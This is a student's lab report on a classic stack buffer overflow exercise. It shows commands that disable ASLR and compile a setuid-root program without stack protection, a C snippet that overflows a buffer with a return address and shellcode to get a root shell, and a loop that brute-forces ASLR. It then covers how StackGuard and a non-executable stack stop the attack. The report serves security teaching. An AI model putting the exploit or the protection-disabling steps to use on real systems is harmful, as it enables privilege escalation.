#+OPTIONS: toc:t num:t
#+TITLE: LAB 5 - REPORT
#+AUTHOR: Justin Kaipada - 100590167
#+LATEX_CLASS: article
#+LATEX_CLASS_OPTIONS: [11pt,letterpaper]
#+LATEX_HEADER: \usepackage[letterpaper,margin=1in]{geometry}
#+LATEX_HEADER: \usepackage{plex-mono}
#+LATEX_HEADER: \usepackage[sfdefault]{plex-sans}
#+LATEX_HEADER: \linespread{1.5} % Change line spacing
#+LATEX_HEADER: \usepackage{xcolor}
#+LATEX_HEADER: \usepackage{soul}
#+LATEX_HEADER: \usepackage{helvet}
#+LATEX_HEADER: \usepackage{listings}
#+LATEX_HEADER: \setlength{\parindent}{0pt} % Change the paragraphs indent to 0, disabling it
#+LATEX_HEADER: \renewcommand\thesection{} % number the headers for toc but hide them
#+LATEX_HEADER: \usepackage{xcolor-solarized}
#+LATEX_HEADER: \definecolor{foreground}{RGB}{184, 83, 83} % For verbatim
#+LATEX_HEADER: \definecolor{background}{RGB}{255, 231, 231} % For verbatim
#+LATEX_HEADER: \let\OldTexttt\texttt
#+LATEX_HEADER: \renewcommand{\texttt}[1]{\OldTexttt{\footnotesize\colorbox{background}{\textcolor{foreground}{#1}}}}
#+LATEX_HEADER: \newenvironment{helvetica}{\fontfamily{phv}\selectfont}{\par}
#+LATEX_HEADER: \usepackage{hyperref} % Make the hyper-links prettier
#+LATEX_HEADER: \hypersetup{
#+LATEX_HEADER: colorlinks=true,
#+LATEX_HEADER: linkcolor=blue!70!white,
#+LATEX_HEADER: urlcolor=blue!95!black
#+LATEX_HEADER: }
#+LATEX_HEADER: \usepackage{enumitem}
#+LATEX_HEADER: \setlist[1]{itemsep=5pt}
#+LATEX_HEADER: \lstset{
#+LATEX_HEADER:  backgroundcolor=\color{white},   % choose the background color; you must add \usepackage{color} or \usepackage{xcolor}; should come as last argument
#+LATEX_HEADER:  basicstyle=\scriptsize,          % the size of the fonts that are used for the code
#+LATEX_HEADER:  breakatwhitespace=false,         % sets if automatic breaks should only happen at whitespace
#+LATEX_HEADER:  breaklines=true,                 % sets automatic line breaking
#+LATEX_HEADER:  captionpos=b,                    % sets the caption-position to bottom
#+LATEX_HEADER:  extendedchars=true,              % lets you use non-ASCII characters; for 8-bits encodings only, does not work with UTF-8
#+LATEX_HEADER:  firstnumber=1000,                % start line enumeration with line 1000
#+LATEX_HEADER:  frame=single,                    % adds a frame around the code
#+LATEX_HEADER:  keepspaces=true,                 % keeps spaces in text, useful for keeping indentation of code (possibly needs columns=flexible)
#+LATEX_HEADER:  keywordstyle=\color{blue},       % keyword style
#+LATEX_HEADER:  language=bash,                   % the language of the code
#+LATEX_HEADER:  morekeywords={ls,ping},          % if you want to add more keywords to the set
#+LATEX_HEADER:  numbers=left,                    % where to put the line-numbers; possible values are (none, left, right)
#+LATEX_HEADER:  numbersep=5pt,                   % how far the line-numbers are from the code
#+LATEX_HEADER:  numberstyle=\tiny\color{mygray}, % the style that is used for the line-numbers
#+LATEX_HEADER:  rulecolor=\color{black},         % if not set, the frame-color may be changed on line-breaks within not-black text (e.g. comments (green here))
#+LATEX_HEADER:  showspaces=false,                % show spaces everywhere adding particular underscores; it overrides 'showstringspaces'
#+LATEX_HEADER:  showstringspaces=false,          % underline spaces within strings only
#+LATEX_HEADER:  showtabs=false,                  % show tabs within strings adding particular underscores
#+LATEX_HEADER:  stepnumber=2,                    % the step between two line-numbers. If it's 1, each line will be numbered
#+LATEX_HEADER:  stringstyle=\color{black},     % string literal style
#+LATEX_HEADER:  tabsize=2,                       % sets default tabsize to 2 spaces
#+LATEX_HEADER:  title=\lstname                   % show the filename of files included with \lstinputlisting; also try caption instead of title
#+LATEX_HEADER: }

#+LATEX_HEADER: \lstset{
#+LATEX_HEADER:  backgroundcolor=\color{white},   % choose the background color; you must add \usepackage{color} or \usepackage{xcolor}; should come as last argument
#+LATEX_HEADER:  basicstyle=\scriptsize,          % the size of the fonts that are used for the code
#+LATEX_HEADER:  breakatwhitespace=false,         % sets if automatic breaks should only happen at whitespace
#+LATEX_HEADER:  breaklines=true,                 % sets automatic line breaking
#+LATEX_HEADER:  captionpos=b,                    % sets the caption-position to bottom
#+LATEX_HEADER:  extendedchars=true,              % lets you use non-ASCII characters; for 8-bits encodings only, does not work with UTF-8
#+LATEX_HEADER:  firstnumber=1000,                % start line enumeration with line 1000
#+LATEX_HEADER:  frame=single,                    % adds a frame around the code
#+LATEX_HEADER:  keepspaces=true,                 % keeps spaces in text, useful for keeping indentation of code (possibly needs columns=flexible)
#+LATEX_HEADER:  keywordstyle=\color{blue},       % keyword style
#+LATEX_HEADER:  language=c,                      % the language of the code
#+LATEX_HEADER:  morekeywords={ls,ping},          % if you want to add more keywords to the set
#+LATEX_HEADER:  numbers=left,                    % where to put the line-numbers; possible values are (none, left, right)
#+LATEX_HEADER:  numbersep=5pt,                   % how far the line-numbers are from the code
#+LATEX_HEADER:  numberstyle=\tiny\color{mygray}, % the style that is used for the line-numbers
#+LATEX_HEADER:  rulecolor=\color{black},         % if not set, the frame-color may be changed on line-breaks within not-black text (e.g. comments (green here))
#+LATEX_HEADER:  showspaces=false,                % show spaces everywhere adding particular underscores; it overrides 'showstringspaces'
#+LATEX_HEADER:  showstringspaces=false,          % underline spaces within strings only
#+LATEX_HEADER:  showtabs=false,                  % show tabs within strings adding particular underscores
#+LATEX_HEADER:  stepnumber=2,                    % the step between two line-numbers. If it's 1, each line will be numbered
#+LATEX_HEADER:  stringstyle=\color{black},     % string literal style
#+LATEX_HEADER:  tabsize=2,                       % sets default tabsize to 2 spaces
#+LATEX_HEADER:  title=\lstname                   % show the filename of files included with \lstinputlisting; also try caption instead of title
#+LATEX_HEADER: }

#+begin_export latex
\newpage % Go to the next page after title page
#+end_export

* Lab setup

For the lab setup made sure to turn off the address space randomization
#+begin_src bash
sudo sysctl -w kernel.randomize_va_space=0
#+end_src

Compiled the shell code with the =execstack= option like so. Files used are the files attached on
blackboard
#+begin_src bash
gcc -z execstack -o call_shellcode call_shellcode.c
#+end_src

#+attr_latex: :width 440px
[[./img/shellcode_compile.png]]

Compiled the vulnerable program as root with =execstack= and also turned of GCCs stack protector
option with =no-stack-protector=.
#+begin_src bash
sudo gcc -o stack -z execstack -fno-stack-protector stack.c
sudo chmod 4755 stack
#+end_src

#+attr_latex: :width 440px
[[./img/stack_cmopile.png]]

#+begin_export latex
\newpage % Go to the next page after title page
#+end_export

* Task 1: Exploiting the Vulnerability

After modifying the exploit.c file compile it and run the vulnerability like this
#+begin_src bash
gcc -o exploit exploit.c
./exploit
./stack
# we should root access shell right now
#+end_src

Look at the code file attached for more comments, essentially what we are doing is overflowing the
stack pointer and then making the program to execute our code which runs the root shell right after.
#+begin_src c
    /* You need to fill the buffer with appropriate contents here */
    int max_num     = sizeof(buffer) - (sizeof(shellcode) + 1);
    ptr             = buffer;
    address_pointer = (long*)(ptr);
    /* could be any number greater, we just want overflow */
    return_address  = get_stack_pointer() + 500;
    // overflow stack pointer with 30 instructions
    for (i = 0; i < 30; i++) {
        *(address_pointer++) = return_address;
    }
    for (i = 0; i < sizeof(shellcode); i++) {
        buffer[max_num + i] = shellcode[i];
    }
    buffer[sizeof(buffer) - 1] = '\0';
#+end_src

*Result*
#+attr_latex: :width 440px
[[./img/stack_execute.png]]

* Task 2: Address Randomization

Turn on address randomization like this
#+begin_src sh
sudo /sbin/sysctl -w kernel.randomize_va_space=2
#+end_src

If we try to run the exploit again after turning on Address randomization it will fail saying
segmentation fault
#+attr_latex: :width 440px
[[./img/random_run.png]]

We can try running the program in a loop as follows
#+begin_src sh
sh -c "while [ 1 ]; do ./stack; done;"
#+end_src

Even after waiting for many executions we can see that the probability getting the correct address
to break the security is really low, so the malicious code fails to do its job again and again

#+attr_latex: :width 440px
[[./img/task_2.png]]

Keep on running for a long time will break the chain however to give us access to the root prompt
#+attr_latex: :width 440px
[[./img/task_2_dumped_at_last.png]]

* Task 3: Stack Guard

For this task we turn off the address space randomization again like this
#+begin_src bash
sudo sysctl -w kernel.randomize_va_space=0
#+end_src

Then we compile the stack program again this time without stack protector option and then set the correct permissions on the executable again
#+begin_src bash
sudo gcc -o stack -z execstack stack.c
sudo chmod 4755 stack
./stack
#+end_src

Immediately upon execution the system detects the stack smashing attempt, stops and prints out the
debug info such as memory map and stack trace of the program.

#+attr_latex: :width 440px
[[./img/task_3.png]]

* Task 4: Non-executable Stack

For this task after making sure the address randomization is off we recompile the stack program with
=noexecstack= option. We can recompile like this
#+begin_src bash
gcc -o stack -fno-stack-protector -z noexecstack stack.c
sudo chmod 4755 stack
./stack				# execute
#+end_src

#+attr_latex: :width 440px
[[./img/task_4.png]]

As you can see the program was halted immediately and exits with a segmentation fault!. This is
because the =noexecstack= stops any shell code placed on the stack to be executed, but since the
system can't handle the overflow it will still kill the program hence the segmentation fault.

* References

- http://www.cs.wright.edu/people/faculty/tkprasad/courses/cs781/alephOne.html
- http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf
- https://www.informit.com/articles/article.aspx?p=430402&seqNum=5
